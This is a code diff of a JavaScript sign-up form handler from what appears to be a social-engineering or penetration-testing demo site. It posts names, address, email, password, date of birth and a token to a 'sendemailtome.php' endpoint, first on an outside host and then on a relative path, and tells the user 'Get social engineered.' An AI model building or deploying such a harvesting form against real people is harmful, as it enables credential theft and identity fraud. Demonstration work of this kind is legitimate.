@@ -49,20 +49,17 @@ function submitFormSignUp(event) {
   const form = "signup";
 
   // Send data to PHP API
-  fetch(
-    "https://www.studentmind.live/penetration_testing/malicious_website/api/sendemailtome.php",
-    {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-      },
-      body: `form=${form}&firstName=${firstName}&middleName=${middleName}&lastName=${lastName}&mobile=${mobile}&address1=${address1}&address2=${address2}&postCode=${postCode}&city=${city}&country=${country}&email=${email}&password=${password}&dob=${dob}&gender=${gender}&token=${token}`,
-    }
-  )
+  fetch("/api/sendemailtome.php", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: `form=${form}&firstName=${firstName}&middleName=${middleName}&lastName=${lastName}&mobile=${mobile}&address1=${address1}&address2=${address2}&postCode=${postCode}&city=${city}&country=${country}&email=${email}&password=${password}&dob=${dob}&gender=${gender}&token=${token}`,
+  })
     .then((response) => response.text())
     .then((data) => {
       if (data === "Email sent") {
-        alert();
+        alert("Get social engineered.");
       } else {
         alert("Something went wrong please try again later.");
       }
